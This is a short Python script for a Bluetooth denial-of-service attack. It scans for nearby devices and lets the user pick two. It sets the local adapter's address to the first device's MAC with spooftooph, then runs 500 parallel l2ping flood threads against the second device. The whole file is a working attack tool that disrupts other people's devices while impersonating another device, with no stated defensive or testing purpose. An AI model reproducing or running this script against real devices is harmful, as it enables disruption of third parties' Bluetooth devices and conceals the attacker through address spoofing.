import asyncio
from bleak import BleakScanner
from rich.console import Console
from rich.table import Table
import subprocess
import threading
import sys
import argparse


async def scan_devices():
    scanner = BleakScanner()
    await scanner.start()
    await asyncio.sleep(5)  # Scan for 5 seconds
    await scanner.stop()
    devices = scanner.discovered_devices
    return devices

def display_devices(devices):
    console = Console()
    table = Table(title="Bluetooth Devices")
    table.add_column("No.", justify="center", style="cyan")
    table.add_column("Device Name", style="magenta")
    table.add_column("MAC Address", style="green")

    for i, device in enumerate(devices, start=1):
        device_name = device.name
        mac_address = device.address
        table.add_row(str(i), device_name, mac_address)

    console.print(table)

def select_option(devices):
    selection = input("Select an option (enter the number): ")
    try:
        index = int(selection) - 1
        if index >= 0 and index < len(devices):
            return devices[index].address
        else:
            raise ValueError()
    except ValueError:
        print("Invalid option. Please try again.")
        return select_option(devices)

async def get_mac():
    # Starting Bluetooth Scan
    devices = await scan_devices()
    display_devices(devices)
    m_selected_device = select_option(devices)
    s_selected_device = select_option(devices)

    return m_selected_device, s_selected_device

def l2ping_flood(mac):
    p = subprocess.Popen(["l2ping", "-s", "600", "-f", mac])
    p.communicate()
    return p.returncode

def main():
    h_mac_address, s_mac_address = asyncio.run(get_mac())
    p = subprocess.Popen(["spooftooph", "-i", "hci1", "-a", h_mac_address])
    print(p.returncode)
    threads = []
    print(s_mac_address)
    for i in range(500):
        t = threading.Thread(target=l2ping_flood, args=(s_mac_address,))
        t.daemon = True
        t.start()
        threads.append(t)
    for t in threads:
        t.join()


if __name__ == "__main__":
    main()
